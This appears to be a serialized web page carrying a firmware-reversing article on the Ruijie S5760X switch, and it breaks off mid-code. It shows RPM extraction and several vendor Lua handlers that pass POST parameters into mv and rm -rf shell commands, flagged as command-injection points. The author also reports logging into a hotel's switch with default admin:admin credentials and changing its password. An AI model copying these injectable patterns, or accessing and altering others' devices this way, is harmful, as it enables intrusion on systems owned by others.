12.5(4)B0702P4\nspec_flag=0\n[uboot_info]\nnum=2\n[uboot1]\nname=u-boot-s57x.bin\nver=1.4.25\nsup_list=0x201000d0;0x201000e0;0x201000f0;0x20270020;0x20100180\n[uboot2]\nname=u-boot-s5760x_2g.bin\nver=1.4.25\nsup_list=0x20100170;0x20100160\n[rboot_info]\nnum=1\n[rboot1]\nname=rboot-arm64-ctc-1.1.35.bin\nver=1.1.35\nsup_list=0x201000d0;0x201000e0;0x201000f0;0x20270020;0x20350010;0x20350020;0x20350030;0x20350040;0x20350050;0x20350060;0x20350070;0x20350080;0x20350090;0x203500a0;0x203500b0;0x203500c0;0x300f0070;0x20100160;0x20100170;0x20100180;0x300f0080\n412x-131\nRUIJIE\n12_main\nlinux\n4bPDrbPDr983595fb39186f7853748c4bf5cdbff6\n514d6f5ee0625d421f4a39e63893507c\na10da9bf913dc09f4c2bcc70e938ba00\n1a08e2c04edd1b1d6bf4f67f1cd60a37\n7d9ab2252d617bb3ef650ed0b141c643\n5a25e57fc5de4b36eb29989ada458ac4\nfb5f8192c0218c618a08d686da938469\nroot\nroot\nroot\nroot\nroot\nroot\nroot\nroot\nroot\nroot\nroot\nroot\nroot\nroot\nmain-1.0.0.562ec491-1.src.rpm\nmain\nrpmlib(PayloadFilesHavePrefix)\nrpmlib(CompressedFileNames)\n4.0-1\n3.0.4-1\n4.11.1\n1.0.0.562ec491-1\nfdt.img\ninitrd.img\nkernel.img\nrboot-arm64-ctc-1.1.35.bin\nrootfs.sqsh\nu-boot-s5760x_2g.bin\nu-boot-s57x.bin\n-O2 -g\ncpio\ngzip\n%{_target_platform}\n"])</script><script>self.__next_f.push([1,"6:[[\"$\",\"header\",null,{\"className\":\"article-head\",\"children\":[[\"$\",\"div\",null,{\"className\":\"breadcrumb\",\"children\":[[\"$\",\"$L5\",null,{\"href\":\"/articles\",\"children\":[\"Research / \",\"Firmware Reversing\"]}],[\"$\",\"span\",null,{\"className\":\"pill\",\"children\":\"RESEARCH\"}]]}],[\"$\",\"h1\",null,{\"children\":\"Inside the Ruijie S5760X.\"}],[\"$\",\"p\",null,{\"className\":\"deck\",\"children\":\"Firmware extraction, HTTP services, and authentication boundaries.\"}],[\"$\",\"div\",null,{\"className\":\"article-byline\",\"children\":[[\"$\",\"span\",null,{\"children\":[\"Security Research\",\"   /   \",[\"$\",\"time\",null,{\"dateTime\":\"2023-06-24\",\"children\":\"2023-06-24\"}]]}],[\"$\",\"span\",null,{\"children\":\"12 min read\"}]]}]]}],[\"$\",\"div\",null,{\"className\":\"article-layout\",\"children\":[[\"$\",\"article\",null,{\"className\":\"prose\",\"children\":[[\"$\",\"$L11\",null,{\"items\":[{\"id\":\"section-1\",\"label\":\"Firmware extraction\"},{\"id\":\"section-2\",\"label\":\"Vulnerability research\"},{\"id\":\"section-3\",\"label\":\"Service reconnaissance\"},{\"id\":\"section-4\",\"label\":\"Investigating the HTTP service\"}],\"label\":\"On this page\",\"mobile\":true}],[\"$\",\"p\",null,{\"className\":\"source-note\",\"children\":[\"Research notes · \",\"Ruijie S5760X vulnerability research\"]}],[[\"$\",\"h2\",\"h2-0\",{\"id\":\"section-1\",\"children\":\"Firmware extraction\"}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":[[\"$\",\"a\",\"a-0\",{\"href\":\"https://www.ruijie.com.cn/fw/rj-cp-s5760x/\",\"rel\":\"noopener noreferrer\",\"children\":\"Ruijie S5760X firmware downloads\"}],\"\\nFirmware version: \",[\"$\",\"code\",\"code-0\",{\"children\":\"S5760X_RGOS12.3(1)B0701\"}],\".\\nInformation from the downloaded package:\"]}],\"\\n\",[\"$\",\"$L12\",\"pre-0\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"$13\"}]}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":\"The package is an RPM, so its filesystem can be extracted with the following commands:\"}],\"\\n\",[\"$\",\"$L12\",\"pre-1\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"rpm2cpio 2222.rpm | cpio -div\\n\\n./fdt.img\\n./initrd.img\\n./kernel.img\\n./rboot-arm64-ctc-1.1.35.bin\\n./rootfs.sqsh\\n./u-boot-s5760x_2g.bin\\n./u-boot-s57x.bin\\n297803 blocks\\n\\n\"}]}],\"\\n\",[\"$\",\"h2\",\"h2-1\",{\"id\":\"section-2\",\"children\":\"Vulnerability research\"}],\"\\n\",[\"$\",\"div\",\"p-2\",{\"className\":\"article-image-row\",\"children\":[\"Device noted during the original research: a hotel switch at \",[\"$\",\"code\",\"code-0\",{\"children\":\"192.168.48.73\"}],\". The default credentials \",[\"$\",\"code\",\"code-1\",{\"children\":\"admin:admin\"}],\" worked; the password was then changed to \",\"$L14\",\".\\n\",\"$L15\",\"\\n\",\"$L16\",\"\\n\",\"$L17\",\"\\n\",\"$L18\",\"\\nInternal network:\\n\",\"$L19\",\"\\n\",\"$L1a\",\"\\n\",\"$L1b\",\"\\nTracing login and related requests led to the following key files:\\n\",\"$L1c\",\"\\nThe backend uses Lua. The issue appeared applicable across the B0701 software examined here.\"]}],\"\\n\",\"$L1d\",\"\\n\",\"$L1e\",\"\\n\",\"$L1f\",\"\\n\",\"$L20\",\"\\n\",\"$L21\",\"\\n\",\"$L22\",\"\\n\",\"$L23\",\"\\n\",\"$L24\",\"\\n\",\"$L25\",\"\\n\",\"$L26\",\"\\n\",\"$L27\",\"\\n\",\"$L28\",\"\\n\",\"$L29\",\"\\n\",\"$L2a\",\"\\n\",\"$L2b\",\"\\n\",\"$L2c\",\"\\n\",\"$L2d\",\"\\n\",\"$L2e\",\"\\n\",\"$L2f\",\"\\n\",\"$L30\",\"\\n\",\"$L31\",\"\\n\",\"$L32\",\"\\n\",\"$L33\",\"\\n\",\"$L34\",\"\\n\",\"$L35\",\"\\n\",\"$L36\",\"\\n\",\"$L37\",\"\\n\",\"$L38\",\"\\n\",\"$L39\",\"\\n\",\"$L3a\",\"\\n\",\"$L3b\",\"\\n\",\"$L3c\",\"\\n\",\"$L3d\",\"\\n\",\"$L3e\",\"\\n\",\"$L3f\",\"\\n\",\"$L40\",\"\\n\",\"$L41\",\"\\n\",\"$L42\",\"\\n\",\"$L43\",\"\\n\",\"$L44\",\"\\n\",\"$L45\",\"\\n\",\"$L46\",\"\\n\",\"$L47\",\"\\n\",\"$L48\",\"\\n\",\"$L49\"],\"$L4a\",\"$L4b\"]}],\"$L4c\"]}],\"$L4d\"]\n"])</script><script>self.__next_f.push([1,"14:[\"$\",\"code\",\"code-2\",{\"children\":\"123456\"}]\n15:[\"$\",\"figure\",\"img-0\",{\"className\":\"article-figure\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/articles/ruijie-s5760x-research/01.png\",\"width\":2428,\"height\":1162,\"style\":{\"width\":2428,\"aspectRatio\":\"2428 / 1162\"},\"alt\":\"\",\"loading\":\"lazy\"}],\"\"]}]\n16:[\"$\",\"figure\",\"img-1\",{\"className\":\"article-figure\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/articles/ruijie-s5760x-research/02.png\",\"width\":2340,\"height\":768,\"style\":{\"width\":2340,\"aspectRatio\":\"2340 / 768\"},\"alt\":\"\",\"loading\":\"lazy\"}],\"\"]}]\n17:[\"$\",\"figure\",\"img-2\",{\"className\":\"article-figure\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/articles/ruijie-s5760x-research/03.png\",\"width\":2376,\"height\":1076,\"style\":{\"width\":2376,\"aspectRatio\":\"2376 / 1076\"},\"alt\":\"\",\"loading\":\"lazy\"}],\"\"]}]\n18:[\"$\",\"figure\",\"img-3\",{\"className\":\"article-figure\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/articles/ruijie-s5760x-research/04.png\",\"width\":2452,\"height\":1164,\"style\":{\"width\":2452,\"aspectRatio\":\"2452 / 1164\"},\"alt\":\"\",\"loading\":\"lazy\"}],\"\"]}]\n19:[\"$\",\"figure\",\"img-4\",{\"className\":\"article-figure\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/articles/ruijie-s5760x-research/05.png\",\"width\":2436,\"height\":542,\"style\":{\"width\":2436,\"aspectRatio\":\"2436 / 542\"},\"alt\":\"\",\"loading\":\"lazy\"}],\"\"]}]\n1a:[\"$\",\"figure\",\"img-5\",{\"className\":\"article-figure\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/articles/ruijie-s5760x-research/06.png\",\"width\":2276,\"height\":628,\"style\":{\"width\":2276,\"aspectRatio\":\"2276 / 628\"},\"alt\":\"\",\"loading\":\"lazy\"}],\"\"]}]\n1b:[\"$\",\"figure\",\"img-6\",{\"className\":\"article-figure\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/articles/ruijie-s5760x-research/07.png\",\"width\":1012,\"height\":1552,\"style\":{\"width\":1012,\"aspectRatio\":\"1012 / 1552\"},\"alt\":\"\",\"loading\":\"lazy\"}],\"\"]}]\n1c:[\"$\",\"code\",\"code-3\",{\"children\":\"sbin/web\"}]\n1d:[\"$\",\"h3\",\"h3-0\",{\"children\":\"httpd lua vulnbility 11\"}]\n1e:[\"$\",\"p\",\"p-3\",{\"children\":\"Searching the relevant functions identified eleven command injection locations:\"}]\n"])</script><script>self.__next_f.push([1,"1f:[\"$\",\"$L12\",\"pre-2\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[\"\\n\",[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-comment\",\"children\":\"-- http://192.168.48.73/web/init.lua/ac.sumng.sumng/mvSumngFile\"}],\"\\n\\n\",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\"(\",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"not\"}],\" GLOBAL_IN) \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\"  \",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\";   \",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cgilua = \",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-string\",\"children\":\"\\\"cgilua\\\"\"}],\");\\n\",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" Page = \",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-11\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.page\\\"\"}],\");\\n\",[\"$\",\"span\",\"span-12\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" \",[\"$\",\"span\",\"span-13\",{\"className\":\"hljs-built_in\",\"children\":\"log\"}],\" = \",[\"$\",\"span\",\"span-14\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-15\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.logger\\\"\"}],\").\",[\"$\",\"span\",\"span-16\",{\"className\":\"hljs-built_in\",\"children\":\"log\"}],\";\\n\",[\"$\",\"span\",\"span-17\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" Utils = \",[\"$\",\"span\",\"span-18\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-19\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.utils\\\"\"}],\");\\n\",[\"$\",\"span\",\"span-20\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" M = \",[\"$\",\"span\",\"span-21\",{\"className\":\"hljs-built_in\",\"children\":\"setmetatable\"}],\"({},{ \",[\"$\",\"span\",\"span-22\",{\"className\":\"hljs-built_in\",\"children\":\"__index\"}],\" = Page }) ;\\n\",[\"$\",\"span\",\"span-23\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" errorPages = \",[\"$\",\"span\",\"span-24\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-25\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.error\\\"\"}],\");\\n\\n\",[\"$\",\"span\",\"span-26\",{\"className\":\"hljs-comment\",\"children\":\"-- Delete all packet-capture files.\"}],\"\\n\",[\"$\",\"span\",\"span-27\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.mvSumngFile\"}],[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}],\"\\n    \",[\"$\",\"span\",\"span-28\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" ret = Utils.IoUtil.retData();\\n    \",[\"$\",\"span\",\"span-29\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" params = cgilua.POST;\\n    \",[\"$\",\"span\",\"span-30\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" filename = params[\",[\"$\",\"span\",\"span-31\",{\"className\":\"hljs-string\",\"children\":\"\\\"filename\\\"\"}],\"];\\n    \",[\"$\",\"span\",\"span-32\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\"(\",[\"$\",\"span\",\"span-33\",{\"className\":\"hljs-built_in\",\"children\":\"string\"}],\".\",[\"$\",\"span\",\"span-34\",{\"className\":\"hljs-built_in\",\"children\":\"find\"}],\"(filename,\",[\"$\",\"span\",\"span-35\",{\"className\":\"hljs-string\",\"children\":\"\\\"%.%.\\\"\"}],\")) \",[\"$\",\"span\",\"span-36\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\" \",[\"$\",\"span\",\"span-37\",{\"className\":\"hljs-comment\",\"children\":\"-- Block path traversal.\"}],\"\\n        errorPages.forward403() ;\\n        \",[\"$\",\"span\",\"span-38\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\";\\n    \",[\"$\",\"span\",\"span-39\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n    \",[\"$\",\"span\",\"span-40\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cmd = \",[\"$\",\"span\",\"span-41\",{\"className\":\"hljs-string\",\"children\":\"'mv /data/tmp/vsd/0/security/sumng/'\"}],\"..filename..\",[\"$\",\"span\",\"span-42\",{\"className\":\"hljs-string\",\"children\":\"' /tmp/vsd/0/security/sumng/'\"}],\"..filename; \",[\"$\",\"span\",\"span-43\",{\"className\":\"hljs-comment\",\"children\":\"--vulnability\"}],\"\\n    \",[\"$\",\"span\",\"span-44\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" rest = Utils.IoUtil.execShell(cmd);\\n    \",[\"$\",\"span\",\"span-45\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}],\".jsonOutPut(ret);\\n\",\"$L4e\",\"\\n\\n\",\"$L4f\",\" M;\\n\"]}]}]\n"])</script><script>self.__next_f.push([1,"20:[\"$\",\"div\",\"p-4\",{\"className\":\"article-image-row\",\"children\":[\"Testing confirmed the issue:\\n\",[\"$\",\"figure\",\"img-0\",{\"className\":\"article-figure\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/articles/ruijie-s5760x-research/08.png\",\"width\":2872,\"height\":1310,\"style\":{\"width\":2872,\"aspectRatio\":\"2872 / 1310\"},\"alt\":\"\",\"loading\":\"lazy\"}],\"\"]}]]}]\n21:[\"$\",\"div\",\"p-5\",{\"className\":\"article-image-row\",\"children\":[\"$\",\"figure\",\"img-0\",{\"className\":\"article-figure\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/articles/ruijie-s5760x-research/09.png\",\"width\":2878,\"height\":1306,\"style\":{\"width\":2878,\"aspectRatio\":\"2878 / 1306\"},\"alt\":\"\",\"loading\":\"lazy\"}],\"\"]}]}]\n22:[\"$\",\"p\",\"p-6\",{\"children\":\"Injection point two:\"}]\n"])</script><script>self.__next_f.push([1,"23:[\"$\",\"$L12\",\"pre-3\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[\"\\n\",[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-comment\",\"children\":\"-- http://192.168.48.73/web/init.lua/ac.system.feature/moveFile\"}],\"\\n\\n\",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (\",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"not\"}],\" GLOBAL_IN) \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\"\\n    \",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\"\\n\",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cgilua = \",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-string\",\"children\":\"\\\"cgilua\\\"\"}],\")\\n\",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" Page = \",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-11\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.page\\\"\"}],\")\\n\",[\"$\",\"span\",\"span-12\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" \",[\"$\",\"span\",\"span-13\",{\"className\":\"hljs-built_in\",\"children\":\"log\"}],\" = \",[\"$\",\"span\",\"span-14\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-15\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.logger\\\"\"}],\").\",[\"$\",\"span\",\"span-16\",{\"className\":\"hljs-built_in\",\"children\":\"log\"}],\"\\n\",[\"$\",\"span\",\"span-17\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" Utils = \",[\"$\",\"span\",\"span-18\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-19\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.utils\\\"\"}],\")\\n\",[\"$\",\"span\",\"span-20\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" M = \",[\"$\",\"span\",\"span-21\",{\"className\":\"hljs-built_in\",\"children\":\"setmetatable\"}],\"({}, {\",[\"$\",\"span\",\"span-22\",{\"className\":\"hljs-built_in\",\"children\":\"__index\"}],\" = Page})\\n\\n\",[\"$\",\"span\",\"span-23\",{\"className\":\"hljs-comment\",\"children\":\"--[[\\n    Move the signature database file.\\n    data = {\\n        name = filename\\n    }\\n]]\"}],\"\\n\",[\"$\",\"span\",\"span-24\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.moveFile\"}],[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}],\"\\n    \",[\"$\",\"span\",\"span-25\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" ret = Utils.IoUtil.retData()\\n    \",[\"$\",\"span\",\"span-26\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" params = cgilua.POST\\n    \",[\"$\",\"span\",\"span-27\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" filename = params[\",[\"$\",\"span\",\"span-28\",{\"className\":\"hljs-string\",\"children\":\"\\\"name\\\"\"}],\"]\\n    \",[\"$\",\"span\",\"span-29\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cmd = \",[\"$\",\"span\",\"span-30\",{\"className\":\"hljs-string\",\"children\":\"\\\"mv -f \\\"\"}],\" .. \",[\"$\",\"span\",\"span-31\",{\"className\":\"hljs-string\",\"children\":\"\\\"'/data/\\\"\"}],\" .. filename .. \",[\"$\",\"span\",\"span-32\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\" .. \",[\"$\",\"span\",\"span-33\",{\"className\":\"hljs-string\",\"children\":\"\\\" '/sbin/signature/app_tmp/\\\"\"}],\" .. filename .. \",[\"$\",\"span\",\"span-34\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\"\\n    ret.data = Utils.IoUtil.execShell(cmd)\\n    \",[\"$\",\"span\",\"span-35\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}],\".jsonOutPut(ret)\\n\",[\"$\",\"span\",\"span-36\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\\n\",[\"$\",\"span\",\"span-37\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" M\\n\"]}]}]\n"])</script><script>self.__next_f.push([1,"24:[\"$\",\"div\",\"p-7\",{\"className\":\"article-image-row\",\"children\":[\"$\",\"figure\",\"img-0\",{\"className\":\"article-figure\",\"children\":[[\"$\",\"img\",null,{\"src\":\"/images/articles/ruijie-s5760x-research/10.png\",\"width\":2878,\"height\":1216,\"style\":{\"width\":2878,\"aspectRatio\":\"2878 / 1216\"},\"alt\":\"\",\"loading\":\"lazy\"}],\"\"]}]}]\n25:[\"$\",\"p\",\"p-8\",{\"children\":\"Injection point three:\"}]\n"])</script><script>self.__next_f.push([1,"26:[\"$\",\"$L12\",\"pre-4\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[\"routers/ac/system/system.lua\\n\",[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.delApBin\"}],\" \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}],\" \\n    \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" ret = Utils.IoUtil.retData();\\n    \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" params = cgilua.POST;\\n    \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" src_tmp = params[\",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-string\",\"children\":\"\\\"src\\\"\"}],\"];\\n    \",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-comment\",\"children\":\"-- Delete only files with a .bin suffix.\"}],\"\\n    \",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\"  tmp= \",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-built_in\",\"children\":\"string\"}],\".\",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-built_in\",\"children\":\"match\"}],\"(src_tmp,\",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-string\",\"children\":\"\\\"%.bin$\\\"\"}],\",\",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-number\",\"children\":\"1\"}],\",\",[\"$\",\"span\",\"span-11\",{\"className\":\"hljs-literal\",\"children\":\"true\"}],\");\\n    \",[\"$\",\"span\",\"span-12\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (tmp ~= \",[\"$\",\"span\",\"span-13\",{\"className\":\"hljs-literal\",\"children\":\"nil\"}],\") \",[\"$\",\"span\",\"span-14\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\"\\n        \",[\"$\",\"span\",\"span-15\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\"(\",[\"$\",\"span\",\"span-16\",{\"className\":\"hljs-built_in\",\"children\":\"string\"}],\".\",[\"$\",\"span\",\"span-17\",{\"className\":\"hljs-built_in\",\"children\":\"find\"}],\"(src_tmp,\",[\"$\",\"span\",\"span-18\",{\"className\":\"hljs-string\",\"children\":\"\\\"%.%.\\\"\"}],\")) \",[\"$\",\"span\",\"span-19\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\" \",[\"$\",\"span\",\"span-20\",{\"className\":\"hljs-comment\",\"children\":\"-- Block path traversal.\"}],\"\\n            errorPages.forward403() ;\\n            \",[\"$\",\"span\",\"span-21\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\";\\n        \",[\"$\",\"span\",\"span-22\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n        \",[\"$\",\"span\",\"span-23\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cmd = \",[\"$\",\"span\",\"span-24\",{\"className\":\"hljs-string\",\"children\":\"\\\"rm -rf \\\"\"}],\" ..\",[\"$\",\"span\",\"span-25\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\".. src_tmp..\",[\"$\",\"span\",\"span-26\",{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\";\\n        Utils.IoUtil.execShell(cmd);\\n        \",[\"$\",\"span\",\"span-27\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}],\".jsonOutPut(ret);\\n    \",[\"$\",\"span\",\"span-28\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\\n\",[\"$\",\"span\",\"span-29\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\\n\",[\"$\",\"span\",\"span-30\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" M;\\n\"]}]}]\n"])</script><script>self.__next_f.push([1,"27:[\"$\",\"p\",\"p-9\",{\"children\":\"Injection point four:\"}]\n"])</script><script>self.__next_f.push([1,"28:[\"$\",\"$L12\",\"pre-5\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-lua\",\"children\":[\"routers/ac/packet/capture.lua\\n\",[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\"(\",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-keyword\",\"children\":\"not\"}],\" GLOBAL_IN) \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}],\"  \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\";   \",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}],\"\\n\",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" cgilua = \",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-string\",\"children\":\"\\\"cgilua\\\"\"}],\");\\n\",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" Page = \",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.page\\\"\"}],\");\\n\",[\"$\",\"span\",\"span-11\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" \",[\"$\",\"span\",\"span-12\",{\"className\":\"hljs-built_in\",\"children\":\"log\"}],\" = \",[\"$\",\"span\",\"span-13\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-14\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.logger\\\"\"}],\").\",[\"$\",\"span\",\"span-15\",{\"className\":\"hljs-built_in\",\"children\":\"log\"}],\";\\n\",[\"$\",\"span\",\"span-16\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" Utils = \",[\"$\",\"span\",\"span-17\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-18\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.utils\\\"\"}],\");\\n\",[\"$\",\"span\",\"span-19\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" M = \",[\"$\",\"span\",\"span-20\",{\"className\":\"hljs-built_in\",\"children\":\"setmetatable\"}],\"({},{ \",[\"$\",\"span\",\"span-21\",{\"className\":\"hljs-built_in\",\"children\":\"__index\"}],\" = Page }) ;\\n\",[\"$\",\"span\",\"span-22\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" errorPages = \",[\"$\",\"span\",\"span-23\",{\"className\":\"hljs-built_in\",\"children\":\"require\"}],\"(\",[\"$\",\"span\",\"span-24\",{\"className\":\"hljs-string\",\"children\":\"\\\"web.lib.error\\\"\"}],\");\\n\\n\",[\"$\",\"span\",\"span-25\",{\"className\":\"hljs-comment\",\"children\":\"-- Delete all packet-capture files.\"}],\"\\n\",[\"$\",\"span\",\"span-26\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.movepcap\"}],[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}],\"\\n    \",[\"$\",\"span\",\"span-27\",{\"className\":\"hljs-keyword\",\"children\":\"local\"}],\" ret = Utils.IoUtil.retData();\\n    